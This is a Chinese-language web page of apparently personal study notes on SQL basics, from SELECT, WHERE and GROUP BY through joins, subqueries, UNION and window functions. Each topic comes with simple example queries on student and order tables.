<h4 id="2-基础语法-查询-选择查询"><a class="header-anchor" href="#2-基础语法-查询-选择查询">¶</a>2 基础语法-查询-选择查询</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, age <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h4 id="3-基础语法-查询-别名"><a class="header-anchor" href="#3-基础语法-查询-别名">¶</a>3 基础语法-查询-别名</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name <span class="keyword">as</span> 学生姓名, age <span class="keyword">as</span> 学生年龄 <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h4 id="4-基础语法-查询-常量和运算"><a class="header-anchor" href="#4-基础语法-查询-常量和运算">¶</a>4 基础语法-查询-常量和运算</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, score, <span class="number">2</span> <span class="operator">*</span> score <span class="keyword">as</span> double_score <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h4 id="5-基础语法-条件查询-where"><a class="header-anchor" href="#5-基础语法-条件查询-where">¶</a>5 基础语法-条件查询-where</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, score <span class="keyword">from</span> student <span class="keyword">where</span> name <span class="operator">=</span> &quot;鱼皮&quot;</span><br></pre></td></tr></table></figure>
<h4 id="6-基础语法-条件查询-运算符"><a class="header-anchor" href="#6-基础语法-条件查询-运算符">¶</a>6 基础语法-条件查询-运算符</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, age <span class="keyword">from</span> student <span class="keyword">where</span> name <span class="operator">!=</span> &quot;热dog&quot;</span><br></pre></td></tr></table></figure>
<h4 id="7-基础语法-条件查询-空值"><a class="header-anchor" href="#7-基础语法-条件查询-空值">¶</a>7 基础语法-条件查询-空值</h4>
<ul>
<li>在SQL查询中，我们可以使用 “IS NULL” 和 “IS NOT NULL” 来判断字段是否为空值或非空值</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, age, score <span class="keyword">from</span> student <span class="keyword">where</span> age <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br></pre></td></tr></table></figure>
<h4 id="8-基础语法-条件查询-模糊查询"><a class="header-anchor" href="#8-基础语法-条件查询-模糊查询">¶</a>8 基础语法-条件查询-模糊查询</h4>
<ul>
<li>使用 <code>like</code> 关键字实现模糊查询</li>
<li>在 LIKE 模糊查询中，我们使用通配符来代表零个或多个字符，从而能够快速地找到匹配的数据。</li>
<li>有如下 2 种通配符：
<ul>
<li>百分号（%）：表示任意长度的任意字符序列。</li>
<li>下划线（_）：表示任意单个字符。</li>
</ul>
</li>
<li>同理，可以使用 <code>not like</code> 来查询不包含某关键字的信息</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, score <span class="keyword">from</span> student <span class="keyword">where</span> name <span class="keyword">not</span> <span class="keyword">like</span> &quot;%李%&quot;</span><br></pre></td></tr></table></figure>
<h4 id="9-基础语法-条件查询-逻辑运算"><a class="header-anchor" href="#9-基础语法-条件查询-逻辑运算">¶</a>9 基础语法-条件查询-逻辑运算</h4>
<p>在逻辑运算中，常用的运算符有：</p>
<ul>
<li>AND：表示逻辑与，要求同时满足多个条件，才返回 true。</li>
<li>OR：表示逻辑或，要求满足其中任意一个条件，就返回 true。</li>
<li>NOT：表示逻辑非，用于否定一个条件（本来是 true，用了 not 后转为 false）</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, score <span class="keyword">from</span> student <span class="keyword">where</span> name <span class="keyword">like</span> &quot;%李%&quot; <span class="keyword">OR</span> score <span class="operator">&gt;</span> <span class="number">500</span></span><br></pre></td></tr></table></figure>
<h4 id="10-基础语法-去重"><a class="header-anchor" href="#10-基础语法-去重">¶</a>10 基础语法-去重</h4>
<ul>
<li>可以使用 <code>DISTINCT</code> 关键字来实现去重操作</li>
<li>除了按照单字段去重外，<code>DISTINCT</code> 关键字还支持根据多个字段的组合来进行去重操作，确保多个字段的组合是唯一的</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> class_id, exam_num <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h3 id="11-基础语法-排序"><a class="header-anchor" href="#11-基础语法-排序">¶</a>11 基础语法-排序</h3>
<ul>
<li>可以使用 <code>ORDER BY</code> 关键字来实现排序操作。<code>ORDER BY</code> 后面跟上需要排序的字段，可以选择升序（ASC）或降序（DESC）排列</li>
<li>在排序的基础上，我们还可以根据多个字段的值进行排序。当第一个字段的值相同时，再按照第二个字段的值进行排序:  <code>order by 字段1 [升序/降序], 字段2 [升序/降序], ...</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, age, score <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> score <span class="keyword">desc</span>, age <span class="keyword">asc</span></span><br></pre></td></tr></table></figure>
<h3 id="12-基础语法-截断与偏移"><a class="header-anchor" href="#12-基础语法-截断与偏移">¶</a>12 基础语法-截断与偏移</h3>
<ul>
<li>
<p>使用 <code>LIMIT</code> 关键字来实现数据的截断和偏移</p>
</li>
<li>
<pre><code class="language-sql">-- LIMIT 后只跟一个整数，表示要截断的数据条数（一次获取几条）
select task_name, due_date from tasks limit 2;

-- LIMIT 后跟 2 个整数，依次表示从第几条数据开始、一次获取几条
select task_name, due_date from tasks limit 2, 2;
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```sql</span><br><span class="line">select name, age from student order by age asc limit 1, 3</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
<li>
<p>注意：第n条数据的下标为n-1</p>
</li>
</ul>
<h3 id="13-基础语法-条件分支"><a class="header-anchor" href="#13-基础语法-条件分支">¶</a>13 基础语法-条件分支</h3>
<ul>
<li>
<p>条件分支 <code>case when</code> 是 SQL 中用于根据条件进行分支处理的语法。它类似于其他编程语言中的 if else 条件判断语句</p>
</li>
<li>
<p><code>case when</code> 支持同时指定多个分支，示例语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CASE</span> <span class="keyword">WHEN</span> (条件<span class="number">1</span>) <span class="keyword">THEN</span> 结果<span class="number">1</span></span><br><span class="line">	   <span class="keyword">WHEN</span> (条件<span class="number">2</span>) <span class="keyword">THEN</span> 结果<span class="number">2</span></span><br><span class="line">	   ...</span><br><span class="line">	   <span class="keyword">ELSE</span> 其他结果 <span class="keyword">END</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">  name,</span><br><span class="line">  <span class="keyword">CASE</span></span><br><span class="line">    <span class="keyword">WHEN</span> (age <span class="operator">&gt;</span> <span class="number">60</span>) <span class="keyword">THEN</span> &quot;老同学&quot;</span><br><span class="line">    <span class="keyword">WHEN</span> (age <span class="operator">&gt;</span> <span class="number">20</span>) <span class="keyword">THEN</span> &quot;年轻&quot;</span><br><span class="line">    <span class="keyword">ELSE</span> &quot;小同学&quot;</span><br><span class="line">  <span class="keyword">END</span> <span class="keyword">AS</span> age_level</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">  student</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> name <span class="keyword">asc</span></span><br></pre></td></tr></table></figure>
<h3 id="14-函数-时间函数"><a class="header-anchor" href="#14-函数-时间函数">¶</a>14 函数-时间函数</h3>
<ul>
<li>常用的时间函数有：
<ul>
<li>DATE：获取当前日期</li>
<li>DATETIME：获取当前日期时间</li>
<li>TIME：获取当前时间</li>
</ul>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 获取当前日期</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">DATE</span>() <span class="keyword">AS</span> <span class="built_in">current_date</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取当前日期时间</span></span><br><span class="line"><span class="keyword">SELECT</span> DATETIME() <span class="keyword">AS</span> current_datetime;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取当前时间</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">TIME</span>() <span class="keyword">AS</span> <span class="built_in">current_time</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, <span class="type">DATE</span>() <span class="keyword">as</span> &quot;当前日期&quot; <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h3 id="15-函数-字符串处理"><a class="header-anchor" href="#15-函数-字符串处理">¶</a>15 函数-字符串处理</h3>
<ul>
<li>
<p>1）使用字符串处理函数 <code>UPPER</code> 将姓名转换为大写：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 将姓名转换为大写</span></span><br><span class="line"><span class="keyword">SELECT</span> name, <span class="built_in">UPPER</span>(name) <span class="keyword">AS</span> upper_name</span><br><span class="line"><span class="keyword">FROM</span> employees;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>2）使用字符串处理函数 <code>LENGTH</code> 计算姓名长度：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 计算姓名长度</span></span><br><span class="line"><span class="keyword">SELECT</span> name, LENGTH(name) <span class="keyword">AS</span> name_length</span><br><span class="line"><span class="keyword">FROM</span> employees;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>3）使用字符串处理函数 <code>LOWER</code> 将姓名转换为小写：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 将姓名转换为小写并进行条件筛选</span></span><br><span class="line"><span class="keyword">SELECT</span> name, <span class="built_in">LOWER</span>(name) <span class="keyword">AS</span> lower_name</span><br><span class="line"><span class="keyword">FROM</span> employees;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, <span class="built_in">UPPER</span>(name) <span class="keyword">AS</span> upper_name <span class="keyword">from</span> student <span class="keyword">where</span> name <span class="operator">=</span> &quot;热dog&quot;</span><br></pre></td></tr></table></figure>
<h3 id="16-函数-聚合函数"><a class="header-anchor" href="#16-函数-聚合函数">¶</a>16 函数-聚合函数</h3>
<p>聚合函数是一类用于对数据集进行 <strong>汇总计算</strong> 的特殊函数。它们可以对一组数据执行诸如计数、求和、平均值、最大值和最小值等操作。聚合函数通常在 SELECT 语句中配合 GROUP BY 子句使用，用于对分组后的数据进行汇总分析。</p>
<ul>
<li>
<p>常见的聚合函数包括：</p>
<ul>
<li>COUNT：计算指定列的行数或非空值的数量。</li>
<li>SUM：计算指定列的数值之和。</li>
<li>AVG：计算指定列的数值平均值。</li>
<li>MAX：找出指定列的最大值。</li>
<li>MIN：找出指定列的最小值。</li>
</ul>
</li>
<li>
<p>1）使用聚合函数 <code>COUNT</code> 计算订单表中的总订单数：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> order_num</span><br><span class="line"><span class="keyword">FROM</span> orders;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>2）使用聚合函数 <code>COUNT(DISTINCT 列名)</code> 计算订单表中不同客户的数量：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> customer_id) <span class="keyword">AS</span> customer_num</span><br><span class="line"><span class="keyword">FROM</span> orders;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>3）使用聚合函数 <code>SUM</code> 计算总订单金额：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(amount) <span class="keyword">AS</span> total_amount</span><br><span class="line"><span class="keyword">FROM</span> orders;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">SUM</span>(score) <span class="keyword">AS</span> total_score, <span class="built_in">AVG</span>(score) <span class="keyword">AS</span> avg_score, <span class="built_in">MAX</span>(score) <span class="keyword">AS</span> max_score, <span class="built_in">MIN</span>(score) <span class="keyword">as</span> min_score <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h3 id="17-分组聚合-单字段分组"><a class="header-anchor" href="#17-分组聚合-单字段分组">¶</a>17 分组聚合-单字段分组</h3>
<ul>
<li>
<p>分组聚合是一种对数据进行分类并对每个分类进行聚合计算的操作。它允许我们按照指定的列或字段对数据进行分组，然后对每个分组应用聚合函数，如 COUNT、SUM、AVG 等，以获得分组后的汇总结果</p>
</li>
<li>
<p>使用 <code>GROUP BY</code> 关键字对数据进行分组</p>
</li>
<li>
<p>1）使用分组聚合查询中每个客户的编号：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> customer_id</span><br><span class="line"><span class="keyword">FROM</span> orders</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> customer_id;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>2）使用分组聚合查询每个客户的下单数：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> customer_id, <span class="built_in">COUNT</span>(order_id) <span class="keyword">AS</span> order_num</span><br><span class="line"><span class="keyword">FROM</span> orders</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> customer_id;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> class_id, <span class="built_in">AVG</span>(score) <span class="keyword">as</span> avg_score <span class="keyword">from</span> student <span class="keyword">group</span> <span class="keyword">by</span> class_id</span><br></pre></td></tr></table></figure>
<h3 id="18-分组聚合-多字段分组"><a class="header-anchor" href="#18-分组聚合-多字段分组">¶</a>18 分组聚合-多字段分组</h3>
<ul>
<li>
<p>多字段分组和单字段分组的实现方式几乎一致，使用 <code>GROUP BY</code> 语法即可</p>
</li>
<li>
<p>要查询使用多字段分组查询表中 <strong>每个客户</strong> 购买的 <strong>每种商品</strong> 的总金额，相当于按照客户编号和商品编号分组：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询每个用户购买的每种商品的总金额，按照客户编号和商品编号分组</span></span><br><span class="line"><span class="keyword">SELECT</span> customer_id, product_id, <span class="built_in">SUM</span>(amount) <span class="keyword">AS</span> total_amount</span><br><span class="line"><span class="keyword">FROM</span> orders</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> customer_id, product_id;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> class_id, exam_num, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">as</span> total_num <span class="keyword">from</span> student <span class="keyword">group</span> <span class="keyword">by</span> class_id, exam_num</span><br></pre></td></tr></table></figure>
<ul>
<li>对GROUP BY还是有点晕……</li>
</ul>
<h3 id="19-分组聚合-having子句"><a class="header-anchor" href="#19-分组聚合-having子句">¶</a>19 分组聚合-having子句</h3>
<ul>
<li>
<p>HAVING 子句用于在<strong>分组聚合</strong>后对分组进行过滤。它允许我们对分组后的结果进行条件筛选，只保留满足特定条件的分组</p>
</li>
<li>
<p>HAVING 子句与条件查询 WHERE 子句的区别在于，WHERE 子句用于在 <strong>分组之前</strong> 进行过滤，而 HAVING 子句用于在 <strong>分组之后</strong> 进行过滤</p>
</li>
<li>
<p>1）使用 HAVING 子句查询订单数超过 1 的客户：</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> customer_id, <span class="built_in">COUNT</span>(order_id) <span class="keyword">AS</span> order_num</span><br><span class="line"><span class="keyword">FROM</span> orders</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> customer_id</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(order_id) <span class="operator">&gt;</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>2）使用 HAVING 子句查询订单总金额超过 100 的客户：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询订单总金额超过100的客户</span></span><br><span class="line"><span class="keyword">SELECT</span> customer_id, <span class="built_in">SUM</span>(amount) <span class="keyword">AS</span> total_amount</span><br><span class="line"><span class="keyword">FROM</span> orders</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> customer_id</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">SUM</span>(amount) <span class="operator">&gt;</span> <span class="number">100</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> class_id, <span class="built_in">SUM</span>(score) <span class="keyword">AS</span> total_score <span class="keyword">from</span> student <span class="keyword">group</span> <span class="keyword">by</span> class_id <span class="keyword">HAVING</span> total_score <span class="operator">&gt;</span> <span class="number">150</span></span><br></pre></td></tr></table></figure>
<h3 id="20-查询进阶-关联查询-cross-join"><a class="header-anchor" href="#20-查询进阶-关联查询-cross-join">¶</a>20 查询进阶-关联查询-cross join</h3>
<ul>
<li>
<p>关联查询是一种用于联合多个数据表中的数据的查询方式</p>
</li>
<li>
<p><code>CROSS JOIN</code> 是一种简单的关联查询，不需要任何条件来匹配行，它直接将左表的 <strong>每一行</strong> 与右表的 <strong>每一行</strong> 进行组合，返回的结果是两个表的笛卡尔积</p>
</li>
<li>
<p>使用 CROSS JOIN 进行关联查询，将员工表和部门表的所有行组合在一起，获取员工姓名、工资、部门名称和部门经理，示例 SQL 代码如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> e.emp_name, e.salary, e.department, d.manager</span><br><span class="line"><span class="keyword">FROM</span> employees e</span><br><span class="line"><span class="keyword">CROSS</span> <span class="keyword">JOIN</span> departments d;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> S.name <span class="keyword">AS</span> student_name, S.age <span class="keyword">AS</span> student_age, S.class_id <span class="keyword">AS</span> class_id, C.name <span class="keyword">AS</span> class_name <span class="keyword">from</span> student S <span class="keyword">cross</span> <span class="keyword">join</span> class C </span><br></pre></td></tr></table></figure>
<ul>
<li>就是多表查询啊，不用<code>cross join</code>，直接在<code>FROM</code>后面加个逗号，加上联合查询的表就行了</li>
</ul>
<h3 id="21-查询进阶-关联查询-inner-join"><a class="header-anchor" href="#21-查询进阶-关联查询-inner-join">¶</a>21 查询进阶-关联查询-inner join</h3>
<ul>
<li>
<p>INNER JOIN 是一种常见的关联查询方式，它根据两个表之间的关联条件，将满足条件的行组合在一起。</p>
</li>
<li>
<p>INNER JOIN 只返回两个表中满足关联条件的交集部分，即在两个表中都存在的匹配行。</p>
</li>
<li>
<p>使用 INNER JOIN 进行关联查询，根据员工表和部门表之间的公共字段 <code>部门名称（department）</code> 进行匹配，将员工的姓名、工资以及所属部门和部门经理组合在一起：</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> e.emp_name, e.salary, e.department, d.manager</span><br><span class="line"><span class="keyword">FROM</span> employees e</span><br><span class="line"><span class="keyword">JOIN</span> departments d <span class="keyword">ON</span> e.department <span class="operator">=</span> d.department;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">  S.name <span class="keyword">AS</span> student_name,</span><br><span class="line">  S.age <span class="keyword">AS</span> student_age,</span><br><span class="line">  C.id <span class="keyword">AS</span> class_id,</span><br><span class="line">  C.name <span class="keyword">AS</span> class_name,</span><br><span class="line">  C.level <span class="keyword">AS</span> class_level</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">  student S</span><br><span class="line">  <span class="keyword">JOIN</span> class C <span class="keyword">ON</span> S.class_id <span class="operator">=</span> C.id</span><br></pre></td></tr></table></figure>
<h3 id="22-查询进阶-关联查询-outer-join"><a class="header-anchor" href="#22-查询进阶-关联查询-outer-join">¶</a>22 查询进阶-关联查询-outer join</h3>
<ul>
<li>
<p>OUTER JOIN 是一种关联查询方式，它根据指定的关联条件，将两个表中满足条件的行组合在一起，并 <strong>包含没有匹配的行</strong></p>
</li>
<li>
<p>在 OUTER JOIN 中，包括 LEFT OUTER JOIN 和 RIGHT OUTER JOIN 两种类型，它们分别表示查询左表和右表的所有行（即使没有被匹配），再加上满足条件的交集部分</p>
</li>
<li>
<p>使用 LEFT JOIN 进行关联查询，根据员工表和部门表之间的部门名称进行匹配，将员工的姓名、工资以及所属部门和部门经理组合在一起，并包含所有员工的信息：</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> e.emp_name, e.salary, e.department, d.manager</span><br><span class="line"><span class="keyword">FROM</span> employees e</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> departments d <span class="keyword">ON</span> e.department <span class="operator">=</span> d.department;</span><br></pre></td></tr></table></figure>
<ul>
<li>有些数据库并不支持 RIGHT JOIN 语法，其实只需要把主表（from 后面的表）和关联表（LEFT JOIN 后面的表）顺序进行调换即可实现效果</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">  S.name <span class="keyword">AS</span> student_name,</span><br><span class="line">  S.age <span class="keyword">AS</span> student_age,</span><br><span class="line">  S.class_id <span class="keyword">AS</span> class_id,</span><br><span class="line">  C.name <span class="keyword">AS</span> class_name,</span><br><span class="line">  C.level <span class="keyword">AS</span> class_level</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">  student S</span><br><span class="line">  <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> class C <span class="keyword">ON</span> S.class_id <span class="operator">=</span> C.id</span><br></pre></td></tr></table></figure>
<h3 id="23-查询进阶-子查询"><a class="header-anchor" href="#23-查询进阶-子查询">¶</a>23 查询进阶-子查询</h3>
<ul>
<li>
<p>子查询是指在一个查询语句内部 <strong>嵌套</strong> 另一个完整的查询语句，内层查询被称为子查询。</p>
</li>
<li>
<p>子查询可以用于获取更复杂的查询结果或者用于过滤数据</p>
</li>
<li>
<p>数据库引擎会首先执行子查询，然后将其结果作为条件或数据源来执行外层查询</p>
</li>
<li>
<p>现在，我们希望查询出订单总金额 &gt; 200 的客户的姓名和他们的订单总金额，示例 SQL 如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 主查询</span></span><br><span class="line"><span class="keyword">SELECT</span> name, total_amount</span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line"><span class="keyword">WHERE</span> customer_id <span class="keyword">IN</span> (</span><br><span class="line">    <span class="comment">-- 子查询</span></span><br><span class="line">    <span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> customer_id</span><br><span class="line">    <span class="keyword">FROM</span> orders</span><br><span class="line">    <span class="keyword">WHERE</span> total_amount <span class="operator">&gt;</span> <span class="number">200</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">  S.name <span class="keyword">AS</span> name,</span><br><span class="line">  S.score <span class="keyword">AS</span> score,</span><br><span class="line">  S.class_id <span class="keyword">AS</span> class_id</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">  student S</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  class_id <span class="keyword">IN</span> (</span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">distinct</span> id</span><br><span class="line">    <span class="keyword">from</span> class C</span><br><span class="line">    <span class="keyword">where</span> C.id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">  )</span><br></pre></td></tr></table></figure>
<h3 id="24-查询进阶-子查询-exists"><a class="header-anchor" href="#24-查询进阶-子查询-exists">¶</a>24 查询进阶-子查询-exists</h3>
<ul>
<li>
<p>子查询中的一种特殊类型是 “exists” 子查询，用于检查主查询的结果集是否存在满足条件的记录，它返回布尔值（True 或 False），而不返回实际的数据</p>
</li>
<li>
<p>现在，我们希望查询出 <strong>存在订单的</strong> 客户姓名和订单金额。</p>
<p>使用 exists 子查询的方式，SQL 代码如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 主查询</span></span><br><span class="line"><span class="keyword">SELECT</span> name, total_amount</span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (</span><br><span class="line">    <span class="comment">-- 子查询</span></span><br><span class="line">    <span class="keyword">SELECT</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">FROM</span> orders</span><br><span class="line">    <span class="keyword">WHERE</span> orders.customer_id <span class="operator">=</span> customers.customer_id</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>和 exists 相对的是 not exists，用于查找不满足存在条件的记录</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">  name,</span><br><span class="line">  age,</span><br><span class="line">  class_id</span><br><span class="line"><span class="keyword">from</span> student S</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> (</span><br><span class="line">    <span class="keyword">select</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">from</span> class C</span><br><span class="line">    <span class="keyword">where</span> S.class_id <span class="operator">=</span> C.id</span><br><span class="line">  )</span><br></pre></td></tr></table></figure>
<h3 id="25-查询进阶-组合查询"><a class="header-anchor" href="#25-查询进阶-组合查询">¶</a>25 查询进阶-组合查询</h3>
<ul>
<li>
<p>组合查询是一种将多个 SELECT 查询结果合并在一起的查询操作。</p>
</li>
<li>
<p>包括两种常见的组合查询操作：UNION 和 UNION ALL</p>
<ul>
<li>UNION 操作：它用于将两个或多个查询的结果集合并， <strong>并去除重复的行</strong> 。即如果两个查询的结果有相同的行，则只保留一行。</li>
<li>UNION ALL 操作：它也用于将两个或多个查询的结果集合并， <strong>但不去除重复的行</strong> 。即如果两个查询的结果有相同的行，则全部保留。</li>
</ul>
</li>
<li>
<p>UNION 操作：</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name, age, department</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> name, age, department</span><br><span class="line"><span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure>
<ul>
<li>UNION ALL 操作：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- UNION ALL操作</span></span><br><span class="line"><span class="keyword">SELECT</span> name, age, department</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> name, age, department</span><br><span class="line"><span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> S.name, S.age, S.score, S.class_id <span class="keyword">from</span> student S </span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span> </span><br><span class="line"><span class="keyword">select</span> SN.name, SN.age, SN.score, SN.class_id <span class="keyword">from</span> student_new SN </span><br></pre></td></tr></table></figure>
<h3 id="26-查询进阶-开窗函数-sum-over"><a class="header-anchor" href="#26-查询进阶-开窗函数-sum-over">¶</a>26 查询进阶-开窗函数-sum over</h3>
<ul>
<li>
<p>开窗函数是一种强大的查询工具，它允许我们在查询中进行对分组数据进行计算、 <strong>同时保留原始行的详细信息</strong></p>
</li>
<li>
<p>开窗函数可以与聚合函数（如 SUM、AVG、COUNT 等）结合使用，但与普通聚合函数不同，开窗函数不会导致结果集的行数减少</p>
</li>
<li>
<p>第一个开窗函数：sum over。</p>
<p>该函数用法为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">SUM</span>(计算字段名) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> 分组字段名)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>现在，我们希望计算每个客户的订单总金额，并显示每个订单的详细信息。</p>
<p>示例 SQL 如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    order_id, </span><br><span class="line">    customer_id, </span><br><span class="line">    order_date, </span><br><span class="line">    total_amount,</span><br><span class="line">    <span class="built_in">SUM</span>(total_amount) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> customer_id) <span class="keyword">AS</span> customer_total_amount</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    orders;</span><br></pre></td></tr></table></figure>
</li>
</ul>
